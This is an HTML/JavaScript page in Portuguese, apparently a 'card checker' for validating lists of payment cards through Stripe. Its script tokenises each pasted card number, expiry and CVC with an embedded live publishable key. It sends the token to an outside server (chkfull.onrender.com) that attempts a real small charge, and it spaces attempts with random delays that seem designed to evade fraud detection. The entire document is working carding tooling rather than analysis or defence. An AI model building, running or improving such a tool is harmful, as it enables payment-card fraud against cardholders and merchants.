<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Checker Stripe (Testes Reais)</title>

    <!-- jQuery -->
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>

    <!-- Bootstrap -->
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css">

    <!-- SweetAlert -->
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@9"></script>

    <style>
        body { background-color: #14192e; color: white; font-family: Arial, sans-serif; }
        .container { max-width: 800px; margin: auto; padding: 20px; background: #232b4a; border-radius: 10px; }
        textarea { width: 100%; height: 150px; background: #1a1a1a; color: white; border: 1px solid #333; padding: 10px; }
        .btn { width: 49%; padding: 10px; border-radius: 5px; cursor: pointer; }
        .btn-success { background: #00ff7f; color: black; }
        .btn-danger { background: #ff4d4d; color: white; }
    </style>
</head>
<body>

<div class="container">
    <h2 class="text-center">Verificador de Cartões (Stripe - Teste Real)</h2>

    <textarea id="lista_cartoes" placeholder="Insira os cartões no formato: 4242424242424242|12|2025|123"></textarea>

    <div class="mt-3">
        <button class="btn btn-success" id="iniciar">Iniciar</button>
        <button class="btn btn-danger" id="parar" disabled>Parar</button>
    </div>

    <h4 class="mt-3">Resultados:</h4>
    <p>Aprovados: <span id="aprovadas">0</span></p>
    <p>Reprovados: <span id="reprovadas">0</span></p>
    <p>Erros: <span id="erros">0</span></p>

    <h4 class="mt-3">Logs:</h4>
    <div id="logs" style="background: black; color: white; padding: 10px; height: 200px; overflow-y: auto;"></div>
</div>

<script>
    let isRunning = false;
    let aprovadas = 0, reprovadas = 0, erros = 0;

    // Configuração do Stripe
    const stripe = Stripe('pk_live_51R1BLCFMTCrh72HkN23f1mf1kcFo1aQIydknl26DXCOsg888WkhcoDcxyKfElSucgvhMxkEdfDFqUdFCbsPi8Csn00CBeL4Vb7');
    const elements = stripe.elements();

    $("#iniciar").click(async function () {
        let lista = $("#lista_cartoes").val().trim().split("\n").filter(l => l.trim() !== "");

        if (lista.length === 0) {
            Swal.fire("Erro!", "Insira pelo menos um cartão!", "error");
            return;
        }

        isRunning = true;
        $("#iniciar").prop("disabled", true);
        $("#parar").prop("disabled", false);
        aprovadas = reprovadas = erros = 0;
        $("#aprovadas").text(0);
        $("#reprovadas").text(0);
        $("#erros").text(0);
        $("#logs").html("");

        for (let linha of lista) {
            if (!isRunning) break;

            await testarCartao(linha);

            let intervalo = Math.floor(Math.random() * (10 - 7 + 1) + 7) * 1000; // Entre 7 e 10 segundos
            await new Promise(resolve => setTimeout(resolve, intervalo));
        }

        Swal.fire("Finalizado!", "Teste concluído!", "success");
        $("#iniciar").prop("disabled", false);
        $("#parar").prop("disabled", true);
    });

    $("#parar").click(function () {
        isRunning = false;
        Swal.fire("Parado!", "O teste foi interrompido!", "warning");
        $("#iniciar").prop("disabled", false);
        $("#parar").prop("disabled", true);
    });

    async function testarCartao(cartao) {
        let [number, month, year, cvc] = cartao.split("|");

        let valorAleatorio = Math.floor(Math.random() * (2000 - 1000 + 1) + 1000); // Entre R$10,00 e R$20,00 (em centavos)

        try {
            // Cria o PaymentMethod no frontend
            const {token, error} = await stripe.createToken('card', {
                number: number.trim(),
                exp_month: month.trim(),
                exp_year: year.trim(),
                cvc: cvc.trim(),
            });

            if (error) {
                reprovadas++;
                $("#reprovadas").text(reprovadas);
                $("#logs").append(`<p style="color: red;">❌ Reprovado: ${cartao} - ${error.message}</p>`);
                return;
            }

            // Envia para o backend para criar o PaymentIntent
            let response = await fetch("https://chkfull.onrender.com/criar-payment-intent", {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify({
                    paymentMethod: token.id, // Envia o token gerado
                    amount: valorAleatorio
                })
            });

            let result = await response.json();

            if (result.success && result.paymentIntentId) {
                // Pagamento aprovado
                aprovadas++;
                $("#aprovadas").text(aprovadas);
                $("#logs").append(`<p style="color: green;">✔️ Aprovado: ${cartao} - Pagamento de R$${(valorAleatorio / 100).toFixed(2)} realizado</p>`);
            } else if (result.error) {
                // Pagamento recusado
                reprovadas++;
                $("#reprovadas").text(reprovadas);
                $("#logs").append(`<p style="color: red;">❌ Reprovado: ${cartao} - ${result.error}</p>`);
            } else {
                // Outro erro
                erros++;
                $("#erros").text(erros);
                $("#logs").append(`<p style="color: orange;">⚠️ Erro ao testar: ${cartao}</p>`);
            }
        } catch (error) {
            // Erro na comunicação com o backend
            erros++;
            $("#erros").text(erros);
            $("#logs").append(`<p style="color: orange;">⚠️ Erro na requisição: ${cartao}</p>`);
        }
    }
</script>

</body>
</html>
